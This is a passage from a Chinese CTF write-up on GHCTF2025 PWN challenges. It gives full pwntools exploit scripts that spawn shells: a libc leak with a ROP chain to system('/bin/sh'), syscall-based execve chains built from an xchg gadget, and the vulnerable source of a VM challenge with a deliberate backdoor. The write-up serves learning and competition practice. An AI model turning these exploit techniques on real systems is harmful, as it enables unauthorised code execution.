<li>而我这边使用<code>onegadget</code>进行打，首先我们需要使用到<code>one_gadget</code>这个插件，之后我们使用如下命令，这时我们的窗口就会输出<code>onegadget</code>，我们来具体介绍一下这些东西</li>
<li>当我们泄露libc地址后计算出<code>ogg</code>的偏移，跳转执行<code>ogg</code>,如果我们的寄存器满足这些条件，那么我们就可以<code>getshell</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget ./libc.so.6</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310005115495.png" alt="image-20250310005115495"></p>
<ul>
<li>这里我选用的是倒数第二个，这时我们还要构造一个<code>rop</code>链，将<code>rax</code>设置为<code>0</code>，由于我们前面栈迁移（第二次栈迁移）会将<code>rbp</code>指针保持在可读可写的<code>bss</code>段中，所以<code>rbp-0x48</code>可写是没问题的。</li>
<li>当我们<code>rbp</code>处于bss段地址比较高的地方，<code>rbp-0x70</code>这个地址保存的值一般都是<code>0</code>，所以<code>[rbp-0x70]=NULL</code>也满足。</li>
<li>然后我们再使用<code>pop rax</code>将<code>rax</code>设置为<code>0</code>就没问题了</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310005307327.png" alt="image-20250310005307327"></p>
<h2 id="ret2libc2_exp"><a href="#ret2libc2-exp" class="headerlink" title="ret2libc2_exp"></a>ret2libc2_exp</h2><ul>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28323</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc2&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">bss_addr = <span class="number">0x404508</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2b</span>+<span class="string">b&#x27;%27$p&#x27;</span>+ p64(bss_addr+<span class="number">0x400</span>)+p64(<span class="number">0x401227</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">libc_start = p.recvline()[:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak--&gt;&quot;</span>,libc_start)</span><br><span class="line">libc_start = <span class="built_in">int</span>(libc_start,<span class="number">16</span>)</span><br><span class="line">libc_addr = libc_start - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]+<span class="number">128</span>))</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x904a9</span></span><br><span class="line">pop_rax = libc_addr + <span class="number">0x45eb0</span></span><br><span class="line">ogg = libc_addr + <span class="number">0xebd43</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+ p64(bss_addr+<span class="number">0x500</span>) <span class="comment">#+ p64(pop_rax)+p64(0)+p64(ogg)</span></span><br><span class="line">payload+= p64(pop_rdi)+ p64(sh_addr)+ p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="你真会布栈吗"><a href="#你真会布栈吗？" class="headerlink" title="你真会布栈吗？"></a>你真会布栈吗？</h1><ul>
<li>考点：<code>syscall</code>、<code>布置rop链</code></li>
<li>这题的打的思路比较多，所以这边就多给几个exp</li>
<li>还有一件事，这题是塞的国际赛题，所以没源码</li>
</ul>
<h2 id="你真会布栈吗_分析"><a href="#你真会布栈吗？-分析" class="headerlink" title="你真会布栈吗？_分析"></a>你真会布栈吗？_分析</h2><ul>
<li>按照流程，先<code>check</code>一下，发现这个程序的保护机制全部没开。</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310010543822.png" alt="image-20250310010543822"></p>
<ul>
<li>这里我们来分析一下这个程序的运行逻辑，我们发现这个程序只有<code>_start函数</code>和<code>print</code>函数</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011019651.png" alt="image-20250310011019651"></p>
<ul>
<li>我们一开始运行程序的时候会先运行<code>_start</code>这个函数，这个函数就相当于<code>main</code>函数，然后我们具体查看一下<code>_start</code>这个函数<ul>
<li>这个函数执行的逻辑其实就是，进行三次输出</li>
<li>然后将用户可以输入内容到栈上，可以写入<code>0x60</code>字节到栈上</li>
<li>之后会返回到<code>rsp</code>指向的地址处</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011431918.png" alt="image-20250310011431918"></p>
<ul>
<li>这时我们再来查看一下<code>print</code>函数<ul>
<li>除了实现主要的输出功能外</li>
<li>我们还发现存在<code>xchg rax,r13</code>，这个指令就是交换<code>rax</code>和<code>r13</code>这两个寄存器的值</li>
<li>最后就是返回</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011646315.png" alt="image-20250310011646315"></p>
<ul>
<li>接下来我们查看一下其他的<code>.text</code>段会发现有给<code>gadgets</code></li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310015206503.png" alt="image-20250310015206503"></p>
<ul>
<li>接下来我们运行一下这个程序，发现这个程序在这边会输出乱码，接下来我们动调和接收一下</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011924906.png" alt="image-20250310011924906"></p>
<h2 id="你真会布栈吗思路1_利用xchg-raxr13和栈地址"><a href="#你真会布栈吗？思路1-利用xchg-rax-r13和栈地址" class="headerlink" title="你真会布栈吗？思路1_利用xchg rax,r13和栈地址"></a>你真会布栈吗？思路1_利用xchg rax,r13和栈地址</h2><ul>
<li>如果知道栈上的地址，我们就可以直接写<code>/bin/sh</code>到栈上，然后计算好偏移即可。这时我们可以直接<code>syscall 59</code>。</li>
<li>所以我们就直接调用<code>gadget</code>进行布置栈，布置到这里<code>gadget</code>就算是利用完成了，这里我们还要注意，jmp到<code>gadgets</code>后<code>rsp</code>这个栈帧并没有增加，所以我们将程序<code>jmp</code>到<code>gadgets</code>的<code>pop_r15</code>这边，这样就可以让<code>rsp</code>指针先增大<code>0x8</code>，接下来才开始真正的布置栈</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083114532.png" alt="image-20250310083114532"></p>
<ul>
<li>接下来我们看执行完<code>xchg</code>后会执行什么，发现执行<code>xchg</code>后会执行，<code>jmp [rsp]</code>，这时我们还可以继续布置栈</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310080228337.png" alt="image-20250310080228337"></p>
<ul>
<li>这时我们的寄存器已经是满足了，现在我们就来满足<code>rdi</code>的值为<code>/bin/sh</code>这个字符串的地址，由于我们的栈地址已知。我们这个时候就能将<code>/bin/sh</code>写入到栈上，这时我们就可以这样布置栈</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083141646.png" alt="image-20250310083141646"></p>
<ul>
<li>这时我们可以计算偏移得到<code>/bin/sh</code>这个字符串的地址与我们接收到栈地址的偏移。接下来我们查看是否能打出来，这边发现已经能执行<code>execve</code>了，但是我们注意到<code>envp</code>这边还有点问题，导致我们<code>execve</code>无法正常调用</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081102077.png" alt="image-20250310081102077"></p>
<ul>
<li>所以就会出现系统调用失败</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081249245.png" alt="image-20250310081249245"></p>
<ul>
<li>这时我们就要利用<code>gadgets</code>对<code>rdx</code>这个寄存器清零操作</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081354593.png" alt="image-20250310081354593"></p>
<ul>
<li><p>这时我们发现这个程序在异或完还会<code>jmp r15</code>，所以我们是不是能先将<code>r15</code>的值赋值成<code>syscall_addr</code>（第一次调用syscall那个地址主要的目的是指向交换两个寄存器的值，此时由于syscall传递的参数不符合，syscall会调用失败。）并且之后执行完xchg后我们就跳转到<code>xor rdx,rdx</code>，这时我们发现<code>r15</code>还指向<code>syscall</code>的地址</p>
</li>
<li><p>所以修改一下布置的栈，修改后栈布置如下：</p>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083318778.png" alt="image-20250310083318778"></p>
<ul>
<li>动调算到的偏移，为程序泄露出来的栈地址<code>leak_addr+0x28</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./Hopper&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x401017</span></span><br><span class="line">syscall = <span class="number">0x40100A</span></span><br><span class="line">xchg = <span class="number">0x40100C</span></span><br><span class="line">pop_r15=<span class="number">0x40101C</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;    (&quot; ~----( ~   Y.  )\n&#x27;</span>)</span><br><span class="line">a = p.recvline()[:<span class="number">6</span>]</span><br><span class="line">a = <span class="built_in">int</span>.from_bytes(a,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---&gt;&quot;</span>,<span class="built_in">hex</span>(a))</span><br><span class="line">payload = p64(pop_r15)+p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(a+<span class="number">0x28</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">59</span>) + p64(syscall)</span><br><span class="line">payload += p64(<span class="number">0x401021</span>)+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="你真会布栈吗思路2_只利用xchg-raxr13"><a href="#你真会布栈吗？思路2-只利用xchg-rax-r13" class="headerlink" title="你真会布栈吗？思路2_只利用xchg rax,r13"></a>你真会布栈吗？思路2_只利用xchg rax,r13</h2><ul>
<li>这个就是单纯的布置栈了。这个我就不写了（写得好累）</li>
<li>直接贴exp：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28015)</span></span><br><span class="line">p = process(<span class="string">&#x27;./Hopper&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">pop_r13_r15 = <span class="number">0x401019</span></span><br><span class="line">print_addr = <span class="number">0x401000</span></span><br><span class="line">a = p64(pop_r13_r15) + p64(<span class="number">0x0</span>) + p64(print_addr) + p64(<span class="number">0x40101c</span>) + p64(<span class="number">0x401017</span>)</span><br><span class="line">a += p64(<span class="number">0x402000</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">a += p64(<span class="number">0x0</span>) + p64(<span class="number">0x40100A</span>) + p64(<span class="number">0x40101c</span>) +p64(<span class="number">0x401017</span>)</span><br><span class="line">a += p64(<span class="number">0x0</span>) + p64(<span class="number">0x402000</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">59</span>) + p64(<span class="number">0x40100A</span>) + p64(<span class="number">0x401021</span>)</span><br><span class="line"><span class="comment">#a += p64(0x40100A)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,a)</span><br><span class="line">b = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#p.send(b&#x27; &#x27;)</span></span><br><span class="line">p.interactive()                          </span><br></pre></td></tr></table></figure>
<h1 id="my_vm"><a href="#my-vm" class="headerlink" title="my_vm"></a>my_vm</h1><ul>
<li><p>主要考点就是：<code>vm_pwn</code>、<code>固定指令设计</code>、<code>越界读写</code></p>
</li>
<li><p>这题就是<code>[OGeek2019 Final]OVM</code>这题改编的，已经改编的比较有好了。原题在动调的时候会比较麻烦，并且越界读写计算偏移比较麻烦。</p>
</li>
<li><p>修改的源码如下，现在就放出我修改的源码：</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> memory[<span class="number">65536</span>];</span><br><span class="line"><span class="type">int</span> reg[<span class="number">12</span>];</span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">void</span> (*funcptr)();</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">fetch</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute</span><span class="params">(<span class="type">int</span> code)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">my_print</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;over!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fetch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a1;</span><br><span class="line">	a1 = memory[reg[<span class="number">11</span>]];</span><br><span class="line">	reg[<span class="number">11</span>] += <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cmd;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> r1;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> r2;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> r3;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> imm;</span><br><span class="line">	cmd = (code &amp; <span class="number">0xff000000</span>)&gt;&gt; <span class="number">24</span>;</span><br><span class="line">	r1  = (code &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">	r2  = (code &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">	r3  = (code &amp; <span class="number">0xf</span>);</span><br><span class="line">	imm = code&amp;<span class="number">0xffff</span>;</span><br><span class="line">	<span class="keyword">if</span> (r1 &gt; <span class="number">11</span> || r2 &gt; <span class="number">11</span> || r3 &gt; <span class="number">11</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;out of index&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(cmd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">			reg[r1] = imm;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">			<span class="built_in">stack</span>[reg[<span class="number">10</span>]] = reg[r1];</span><br><span class="line">			reg[<span class="number">10</span>]+=<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">			reg[<span class="number">10</span>]-=<span class="number">1</span>;</span><br><span class="line">			reg[r1] = <span class="built_in">stack</span>[reg[<span class="number">10</span>]];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line">			reg[r1] = reg[r2] + reg[r3];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">			reg[r1] = reg[r2] - reg[r3];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x60</span>:</span><br><span class="line">			reg[r1] = reg[r2] ^ reg[r3];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x70</span>:</span><br><span class="line">			reg[r1] = reg[r2] &gt;&gt; reg[r3];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x80</span>:</span><br><span class="line">			reg[r1] = reg[r2] &lt;&lt; reg[r3];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">			memory[reg[r1]] = reg[r2];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> ip;</span><br><span class="line">	<span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> sp;</span><br><span class="line">	<span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">	<span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">	<span class="type">int</span> code;</span><br><span class="line">	funcptr = my_print;</span><br><span class="line">	init();</span><br><span class="line"></span><br><span class="line">	write(<span class="number">1</span>,<span class="string">&quot;This is my vm.\n&quot;</span>,<span class="number">15</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set your IP:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;ip);</span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set your SP:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;sp);</span><br><span class="line">	getchar();</span><br><span class="line">	reg[<span class="number">10</span>] = sp;</span><br><span class="line">	reg[<span class="number">11</span>] = ip;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( ip &gt; <span class="number">0x2000</span> || !sp)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;How much code do you want to execve:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;size);</span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>( count=<span class="number">0</span>; count &lt; size; count++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;memory[count]);</span><br><span class="line">		getchar();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>( count=<span class="number">0</span>; count &lt; size; count++)</span><br><span class="line">	&#123;</span><br><span class="line">		code = fetch();</span><br><span class="line">		execute(code);</span><br><span class="line">	&#125;	</span><br><span class="line">	funcptr();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li>对于<code>vm_pwn</code>的这类题目，其实有涉及到一点计算机组成原理的<code>设计操作码</code>的技术。在计算机组成原理中，我们可以采用固定操作码的技术，也可以采用<code>扩展操作码</code>的技术。</li>
<li>这里我们稍微介绍一下固定操作码和拓展操作码。以我们常用的<code>64</code>位计算机为例子。</li>
<li><p>在<code>x64</code>架构下，我们的处理器一次能处理<code>8</code>字节的数据，我们在设计二进制操作码的时候可以这么设计。</p>
<ul>
<li>我们可以固定最高<code>16</code>位（也就是<code>49-64</code>位）表示要执行的指令，比如<code>mov</code>、<code>sub</code>、<code>add</code>这些指令</li>
<li>而我们而我们还可以分别设计<code>33-48</code>位表示目的寄存器的编号，<code>17-32</code>位表示源寄存器的编号，<code>1-16</code>位也还可以表示源寄存器的编号。</li>
